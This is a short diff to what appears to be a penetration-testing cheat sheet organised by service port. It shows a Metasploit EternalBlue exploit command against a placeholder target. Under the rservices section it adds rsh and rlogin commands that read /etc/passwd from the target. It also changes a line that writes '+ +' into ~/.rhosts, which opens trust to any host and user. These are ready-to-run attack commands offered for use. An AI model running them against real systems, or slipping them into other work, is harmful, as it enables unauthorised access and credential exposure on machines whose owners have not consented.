@@ -603,7 +603,9 @@ download file.txt
 msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; run'
 
 [*] (512-514) RSERVICES
-echo '+ +' > .rhosts; chmod 600 .rhosts
+rsh -l $USERNAME $TARGET cat /etc/passwd
+rlogin -l $USERNAME $TARGET cat /etc/passwd
+echo '+ +' > ~/.rhosts; chmod 600 ~/.rhosts
 rlogin $USERNAME@$TARGET
 
 [*] (1433) MSSQL
